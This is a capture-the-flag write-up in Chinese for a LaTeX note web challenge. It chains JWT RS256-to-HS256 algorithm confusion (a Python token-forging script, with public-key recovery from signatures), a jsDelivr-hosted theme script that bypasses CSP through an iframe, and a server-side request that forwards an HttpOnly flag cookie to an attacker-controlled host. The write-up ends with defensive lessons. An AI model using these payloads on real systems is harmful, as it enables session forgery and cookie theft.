# Easylatex

## 题目简述

题目是一个支持 LaTeX 预览、保存笔记和管理员访问的 Express 应用。普通用户只能使用内置主题，VIP 用户可以为笔记指定任意主题目录；Bot 会携带 HttpOnly 的 `flag` Cookie 访问分享链接。

完整利用链由三部分组成：自定义 JWT 实现允许 RS256/HS256 算法混淆；受信任的 jsDelivr 主题目录可以加载攻击者脚本；`POST /vip` 会把浏览器提交的全部 Cookie 转发到由 JWT `username` 控制的 URL，最终把 HttpOnly flag 发到攻击者服务器。

## 解题过程

### 1. 伪造 VIP JWT

登录接口的密码只是用户名的 MD5：

```javascript
if (md5(username) != password) {
    return res.render('login', { msg: 'login failed' });
}
res.cookie('token', sign({ username, isVip: false }));
```

因此可以任选用户名，计算其 MD5 后取得合法的 RS256 Token。自定义 `jwt.verify()` 没有固定算法，而是信任 JWT 头部的 `alg`。当头部改为 `HS256` 时，它会把传入的 RSA 公钥文件 Buffer 直接转换成 HMAC 密钥：

```javascript
if (header.alg.startsWith('HS')) {
    key = createSecretKey(Buffer.isBuffer(key) ? key : Buffer.from(key));
}
```

这构成经典的 RSA/HMAC 算法混淆。公钥没有直接暴露，但可以申请至少两个已知消息的 RS256 Token，并利用 PKCS#1 v1.5 签名关系恢复模数。对每个签名有

$s^e \equiv m \pmod n$，

所以 $n$ 同时整除 $s_1^e-m_1$ 与 $s_2^e-m_2$；计算两者最大公因数即可得到 $n$ 或它的小倍数，再用第三枚 Token 验证候选值。指数通常为 $e=65537$。将恢复出的 $(n,e)$ 编码成 SubjectPublicKeyInfo PEM，即可得到与容器 `pub.key` 相同的字节序列。

设恢复出的文件为 `pub.pem`，下面的脚本用它签发 HS256 Token。`username` 必须是攻击者接收请求的绝对 URL，同时设置 `isVip: true`：

```python
import base64
import hashlib
import hmac
import json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "username": "http://ATTACKER_HOST/collect",
    "isVip": True
}

part1 = b64url(json.dumps(header, separators=(',', ':')).encode())
part2 = b64url(json.dumps(payload, separators=(',', ':')).encode())
signing_input = f'{part1}.{part2}'.encode()
key = open('pub.pem', 'rb').read()
signature = hmac.new(key, signing_input, hashlib.sha256).digest()

print(f'{part1}.{part2}.{b64url(signature)}')
```

### 2. 通过主题加载脚本并绕过 CSP

VIP 提交笔记时，`theme` 会原样保存。查看笔记时，它被解析为 LaTeX.js 的 `baseURL`：

```javascript
base = new URL(theme, `http://${req.headers.host}/theme/`) + '/';
```

`/note/:id` 的 CSP 允许 `https://cdn.jsdelivr.net`，所以可以把恶意主题放入公开 GitHub 仓库，再用 jsDelivr 的 GitHub CDN 地址作为 `theme`。目录结构中放置 `js/base.js`，LaTeX.js 加载主题时就会执行该脚本。正文已说明为何该 CDN 可用、主题脚本的加载位置和后续行为；无需依赖外部文章才能理解利用。

笔记页的 `default-src` 不允许脚本直接连接 `/vip`。题目所用浏览器环境中，可以创建一个同源 iframe，再从它的 `contentWindow` 调用 `fetch`；请求使用 iframe 的执行上下文，从而不受笔记文档这条连接限制。恶意 `js/base.js` 可以写成：

```javascript
const forgedToken = 'REPLACE_WITH_FORGED_JWT';
document.cookie = `token=${forgedToken}; path=/`;

const iframe = document.createElement('iframe');
iframe.style.display = 'none';
document.body.appendChild(iframe);

setTimeout(() => {
    iframe.contentWindow.fetch('/vip', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'code=x'
    });
}, 300);
```

先带伪造 Token 调用 `POST /note`，把 jsDelivr 主题 URL 写入笔记；取得 ID 后访问 `/share/<id>`，Bot 就会打开该笔记并执行脚本。脚本必须先在 Bot 域下写入伪造的 `token` Cookie，因为 Bot 的无痕上下文本来只有题目设置的 `flag` Cookie。

### 3. 利用 `/vip` 转发 HttpOnly Cookie

`/vip` 从已验证 JWT 中读取 `username`，用它与内网 VIP 服务地址构造目标 URL，然后把当前请求的全部 Cookie 放进服务端请求头：

```javascript
const username = req.session.username;
const target = new URL(username, VIP_URL);

await fetch(target, {
    method: 'POST',
    headers: {
        Cookie: Object.entries(req.cookies)
            .map(([k, v]) => `${k}=${v}`)
            .join('; ')
    },
    body: new URLSearchParams({ code })
});
```

因为伪造 Token 中的 `username` 是绝对 URL，`new URL()` 会忽略内网基址，改为请求 `http://ATTACKER_HOST/collect`。浏览器向同源 `/vip` 发请求时会自动携带 HttpOnly 的 `flag` Cookie；Web 服务随后又把它复制到对外请求中。攻击者最终会收到类似请求：

```http
POST /collect HTTP/1.1
Cookie: flag=ACTF{...}; token=eyJ...
Content-Type: application/x-www-form-urlencoded

code=x
```

另一个入口是把编码后的 `../preview?theme=...` 作为分享 ID，使 Bot 构造出的 `/note/<id>` 经 URL 归一化后落到没有 CSP 的 `/preview`。这可以省去笔记页的 CSP 绕过，但 JWT 伪造和 `/vip` Cookie 转发仍是取 flag 的关键步骤。

## 方法总结

本题串联了身份、浏览器和服务端请求三个信任边界。JWT 验证必须固定允许的算法，并禁止把非对称公钥当作 HMAC 密钥；允许用户控制资源根目录时，CSP 中的可信 CDN 也会变成脚本托管点；服务端请求更不应根据身份字段选择绝对 URL，也不能无条件转发浏览器 Cookie。HttpOnly 只阻止 JavaScript 直接读取 Cookie，无法阻止应用自己的接口把 Cookie 复制到攻击者可控请求中。
